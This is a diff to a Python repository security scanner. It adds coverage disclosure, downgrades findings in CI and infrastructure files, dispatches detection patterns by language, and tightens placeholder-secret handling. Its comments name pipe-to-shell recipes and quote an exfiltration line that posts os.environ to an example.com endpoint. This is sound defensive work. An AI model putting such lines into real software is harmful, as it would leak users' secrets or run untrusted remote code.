@@ -68,6 +68,11 @@ class ScanResult:
     findings: list[Finding] = field(default_factory=list)
     positive_signals: list[str] = field(default_factory=list)
     files_scanned: int = 0
+    # Coverage disclosure (#4): total scannable files BEFORE the _MAX_FILES_PER_REPO cap,
+    # and whether the grade is only a sample of the repo — so a partial-coverage grade is
+    # never presented as an authoritative whole-repo verdict.
+    total_scannable_files: int = 0
+    sampled: bool = False
     has_readme: bool = False
     has_license: bool = False
     has_tests: bool = False
@@ -131,6 +136,82 @@ def _is_test_or_doc_file(file_path: str) -> bool:
     return False
 
 
+def _is_infra_file(file_path: str) -> bool:
+    """#3 — CI/infra config, graded like tests/docs (not shipped code).
+
+    Dockerfiles, `.github/**` / `.gitlab/**` workflow YAMLs, and agent skill configs
+    (`.agents/**`) legitimately contain `RUN curl | sh`, pipe-to-shell, etc. Their
+    findings are DOWNGRADED (same as tests/docs) so a single CI recipe can't produce
+    the critical that zeroes an otherwise-clean repo's grade.
+    """
+    parts = Path(file_path).parts
+    if any(p in (".github", ".gitlab", ".agents", ".circleci", ".buildkite") for p in parts):
+        return True
+    name = Path(file_path).name
+    lname = name.lower()
+    if name == "Dockerfile" or name.startswith("Dockerfile.") or lname.endswith(".dockerfile"):
+        return True
+    # Common root-level CI config files
+    if lname in (".gitlab-ci.yml", ".travis.yml", "azure-pipelines.yml", "cloudbuild.yaml"):
+        return True
+    # Workflow YAMLs (e.g. under a workflows/ directory)
+    if any(p == "workflows" for p in parts) and lname.endswith((".yml", ".yaml")):
+        return True
+    return False
+
+
+# --- Per-file language dispatch (#2) -----------------------------------------
+# Language-SPECIFIC pattern groups must only run on files of that language, so Python
+# `exec()` no longer fires on `.mjs` and Ruby `system`/backtick no longer fires on TS
+# template literals. Language-AGNOSTIC groups (secrets, exfiltration, invisible unicode,
+# prompt injection, obfuscation) keep running on every file.
+_EXT_TO_LANG: dict[str, str] = {
+    ".py": "python", ".ipynb": "python",
+    ".js": "javascript", ".mjs": "javascript", ".cjs": "javascript", ".jsx": "javascript",
+    ".ts": "typescript", ".tsx": "typescript",
+    ".rb": "ruby",
+    ".go": "go",
+    ".rs": "rust",
+    ".java": "java",
+}
+
+# A pattern's NAME carries its language tag (e.g. "(Python)", "(Node.js)"); map those
+# tags to the file-languages they apply to. Node runs both JS and TS.
+_PATTERN_LANG_TAGS: list[tuple[str, frozenset]] = [
+    ("python", frozenset({"python"})),
+    ("node", frozenset({"javascript", "typescript"})),
+    ("(js)", frozenset({"javascript", "typescript"})),
+    ("ruby", frozenset({"ruby"})),
+    ("(go)", frozenset({"go"})),
+    ("rust", frozenset({"rust"})),
+    ("java", frozenset({"java"})),
+]
+
+
+def _required_langs(pattern_name: str) -> frozenset:
+    """Languages a pattern targets, inferred from its name. Empty = language-agnostic."""
+    lname = pattern_name.lower()
+    langs: set = set()
+    for tag, mapped in _PATTERN_LANG_TAGS:
+        if tag in lname:
+            langs |= mapped
+    return frozenset(langs)
+
+
+def _lang_ok(pattern_name: str, file_lang: str | None) -> bool:
+    """True if a (possibly language-specific) pattern should run on this file.
+
+    Patterns whose name has no language tag are agnostic → always run. A tagged
+    pattern runs only when the file's detected language is one it targets.
+    """
+    required = _required_langs(pattern_name)
+    if not required:
+        return True
+    if file_lang is None:
+        return False
+    return file_lang in required
+
+
 def _redact_secret(line: str, match: re.Match) -> str:  # type: ignore[type-arg]
     """Redact the actual secret value from the snippet."""
     start, end = match.span()
@@ -143,22 +224,34 @@ def _redact_secret(line: str, match: re.Match) -> str:  # type: ignore[type-arg]
 
 
 def _detect_language(files: list[dict]) -> str:
-    """Detect primary language from file extensions."""
+    """Detect primary language from file extensions.
+
+    #5 — only counts *real programming-language* extensions (the keys of ``lang_map``);
+    config/data files (.json/.yaml/.toml/.ini/…) are NOT languages, so a TypeScript repo
+    full of package.json/tsconfig.json no longer reports its primary language as ".json".
+    """
+    lang_map = {
+        ".py": "Python", ".ipynb": "Python",
+        ".js": "JavaScript", ".mjs": "JavaScript", ".cjs": "JavaScript",
+        ".jsx": "JavaScript",
+        ".ts": "TypeScript", ".tsx": "TypeScript",
+        ".go": "Go", ".rs": "Rust", ".rb": "Ruby",
+        ".java": "Java", ".kt": "Kotlin", ".cs": "C#",
+        ".php": "PHP", ".swift": "Swift", ".scala": "Scala",
+        ".lua": "Lua", ".pl": "Perl", ".pm": "Perl", ".r": "R",
+        ".groovy": "Groovy",
+        ".sh": "Shell", ".bash": "Shell", ".zsh": "Shell",
+    }
     ext_counts: dict[str, int] = {}
     for f in files:
         ext = Path(f.get("path", "")).suffix.lower()
-        if ext in SOURCE_EXTENSIONS:
+        if ext in lang_map:
             ext_counts[ext] = ext_counts.get(ext, 0) + 1
 
-    lang_map = {
-        ".py": "Python", ".js": "JavaScript", ".ts": "TypeScript",
-        ".go": "Go", ".rs": "Rust", ".rb": "Ruby",
-        ".java": "Java", ".kt": "Kotlin", ".cs": "C#",
-    }
     if not ext_counts:
         return "unknown"
     top_ext = max(ext_counts, key=ext_counts.get)  # type: ignore[arg-type]
-    return lang_map.get(top_ext, top_ext)
+    return lang_map[top_ext]
 
 
 async def _fetch_repo_tree(
@@ -220,6 +313,13 @@ def _scan_content(
     positives: list[str] = []
 
     is_test_or_doc = _is_test_or_doc_file(file_path)
+    # CI/infra files (#3) are graded like tests/docs so a Dockerfile / workflow recipe
+    # can't dominate the grade with a critical.
+    is_infra = _is_infra_file(file_path)
+    # Findings in tests/docs/infra are downgraded.
+    is_downgraded = is_test_or_doc or is_infra
+    # Per-file language for language-specific pattern dispatch (#2).
+    file_lang = _EXT_TO_LANG.get(Path(file_path).suffix.lower())
     # Manifest / skill files ARE the tool's instruction surface — never downgrade
     # prompt-injection / hidden-unicode there even if they look doc-ish.
     is_metadata = Path(file_path).name.lower() in AGENT_METADATA_FILES
@@ -229,8 +329,11 @@ def _scan_content(
         stripped = line.strip()
         if stripped.startswith(("#", "//", "*", "/*")):
             continue
-        if "example" in stripped.lower() or "placeholder" in stripped.lower():
-            continue
+        # NOTE (#6): we deliberately do NOT skip an entire line just because it contains
+        # the word "example"/"placeholder" — that let an attacker neutralize any rule with
+        # `# example` and silently ignored real code like
+        # `requests.post("https://example.com/collect", data=os.environ)`. Placeholder
+        # handling is now scoped to the matched secret VALUE only (see the secret loop).
 
         # Check secrets
         for name, pattern, severity in SECRET_PATTERNS:
@@ -238,8 +341,13 @@ def _scan_content(
             if match:
                 if ".example" in file_path or "test" in file_path.lower():
                     continue
-                val = match.group()
-                if val in ("YOUR_API_KEY", "your_api_key", "xxx", "changeme"):
+                # Skip if the MATCHED VALUE is clearly a placeholder (not the whole line).
+                # The captured secret value (group 1 when present, else the full match).
+                val = match.group(1) if match.groups() else match.group()
+                val_lower = val.lower()
+                if val in ("YOUR_API_KEY", "your_api_key", "xxx", "changeme") or any(
+                    tok in val_lower for tok in ("example", "placeholder", "your_api_key")
+                ):
                     continue
                 findings.append(Finding(
                     category="secret",
@@ -254,10 +362,17 @@ def _scan_content(
         # Check unsafe exec
         for name, pattern, severity in UNSAFE_EXEC_PATTERNS:
             if pattern.search(line):
+                # Language dispatch (#2): skip a language-specific pattern on a
+                # non-matching file (e.g. Python exec() on a .mjs file).
+                if not _lang_ok(name, file_lang):
+                    continue
+                effective_severity = severity
+                if is_downgraded and severity in ("critical", "high"):
+                    effective_severity = "medium"
                 findings.append(Finding(
                     category="unsafe_exec",
                     name=name,
-                    severity=severity,
+                    severity=effective_severity,
                     file_path=file_path,
                     line_number=line_num,
                     snippet=stripped[:120],
@@ -267,17 +382,23 @@ def _scan_content(
         # Check file system access
         for name, pattern, severity in FS_ACCESS_PATTERNS:
             if pattern.search(line):
+                # Language dispatch (#2)
+                if not _lang_ok(name, file_lang):
+                    continue
+                effective_severity = severity
+                if is_downgraded and severity in ("critical", "high"):
+                    effective_severity = "medium"
                 findings.append(Finding(
                     category="fs_access",
                     name=name,
-                    severity=severity,
+                    severity=effective_severity,
                     file_path=file_path,
                     line_number=line_num,
                     snippet=stripped[:120],
                 ))
                 break
 
-        # Check data exfiltration
+        # Check data exfiltration (language-agnostic — always runs)
         for name, pattern, severity in EXFILTRATION_PATTERNS:
             if pattern.search(line):
                 findings.append(Finding(
@@ -290,7 +411,7 @@ def _scan_content(
                 ))
                 break
 
-        # Check obfuscation
+        # Check obfuscation (language-agnostic — always runs)
         for name, pattern, severity in OBFUSCATION_PATTERNS:
             if pattern.search(line):
                 findings.append(Finding(
@@ -306,8 +427,11 @@ def _scan_content(
         # Check insecure deserialization — RCE class
         for name, pattern, severity in INSECURE_DESERIALIZATION_PATTERNS:
             if pattern.search(line):
+                # Language dispatch (#2)
+                if not _lang_ok(name, file_lang):
+                    continue
                 effective_severity = severity
-                if is_test_or_doc and severity in ("critical", "high"):
+                if is_downgraded and severity in ("critical", "high"):
                     effective_severity = "medium"
                 findings.append(Finding(
                     category="insecure_deserialization",
@@ -322,8 +446,11 @@ def _scan_content(
         # Check dynamic remote payload / rug-pull (external-URL-swap)
         for name, pattern, severity in DYNAMIC_REMOTE_LOAD_PATTERNS:
             if pattern.search(line):
+                # Language dispatch (#2) — untagged patterns (e.g. curl|sh) stay agnostic.
+                if not _lang_ok(name, file_lang):
+                    continue
                 effective_severity = severity
-                if is_test_or_doc and severity in ("critical", "high"):
+                if is_downgraded and severity in ("critical", "high"):
                     effective_severity = "medium"
                 findings.append(Finding(
                     category="dynamic_remote_load",
@@ -351,10 +478,10 @@ def _scan_content(
         # Check prompt injection / tool-description poisoning
         for name, pattern, severity in PROMPT_INJECTION_PATTERNS:
             if pattern.search(line):
-                # Downgrade in test/doc/example files — EXCEPT manifest/skill
+                # Downgrade in test/doc/infra files — EXCEPT manifest/skill
                 # metadata, which is the actual attack surface.
                 effective_severity = severity
-                if is_test_or_doc and not is_metadata and severity in ("critical", "high"):
+                if is_downgraded and not is_metadata and severity in ("critical", "high"):
                     effective_severity = "medium"
                 findings.append(Finding(
                     category="prompt_injection",
@@ -369,7 +496,7 @@ def _scan_content(
     # Split fetch->exec across lines: a network read + an exec sink co-occurring in
     # one file is the classic rug-pull loader the per-line scan can't see. Fire only
     # when they're within ~40 lines of each other (keeps the composite finding tight).
-    if not is_test_or_doc and NET_READ_RE.search(content) and EXEC_SINK_RE.search(content):
+    if not is_downgraded and NET_READ_RE.search(content) and EXEC_SINK_RE.search(content):
         net_lines = [i for i, ln in enumerate(lines) if NET_READ_RE.search(ln)]
         exec_lines = [i for i, ln in enumerate(lines) if EXEC_SINK_RE.search(ln)]
         if net_lines and exec_lines and any(
@@ -389,7 +516,7 @@ def _scan_content(
         findings.extend(_scan_manifest_exec(content, file_path))
 
     # Toxic-flow / lethal-trifecta composition — whole-file capability co-occurrence
-    findings.extend(_composite_findings(content, file_path, lines, is_test_or_doc))
+    findings.extend(_composite_findings(content, file_path, lines, is_downgraded))
 
     # npm install hooks — auto-run on `npm install` (supply-chain entry point)
     if Path(file_path).name.lower() == "package.json":
@@ -485,7 +612,7 @@ def _composite_findings(
     content: str,
     file_path: str,
     lines: list[str],
-    is_test_or_doc: bool,
+    is_downgraded: bool,
 ) -> list[Finding]:
     """The lethal trifecta: private-data read + untrusted input + outbound send.
 
@@ -528,7 +655,7 @@ def _composite_findings(
         severity = "medium"
         line = file_read[0]
 
-    if is_test_or_doc and severity in ("critical", "high"):
+    if is_downgraded and severity in ("critical", "high"):
         severity = "medium"
 
     return [Finding(
@@ -612,15 +739,23 @@ async def scan_repo(
             if "test" in path_lower or "spec" in path_lower:
                 result.has_tests = True
 
-        scan_files = [
+        scannable_files = [
             item for item in tree
             if not _should_skip_path(item["path"])
             and _is_source_file(item["path"])
-        ][:_MAX_FILES_PER_REPO]
+        ]
+        # Coverage disclosure (#4): record the full scannable count BEFORE the cap, and
+        # flag when the grade is only a sample of the repo (more scannable files than the
+        # per-repo cap), so a partial-coverage grade is never presented as authoritative.
+        result.total_scannable_files = len(scannable_files)
+        result.sampled = result.total_scannable_files > _MAX_FILES_PER_REPO
+        scan_files = scannable_files[:_MAX_FILES_PER_REPO]
 
         for item in scan_files:
             path = item["path"]
             content = await _fetch_file_content(owner, repo, path, token)
+            # #7 — a failed/empty fetch must NOT inflate files_scanned; only count a file
+            # once it was actually fetched AND scanned, so the reported coverage is real.
             if not content:
                 continue
 
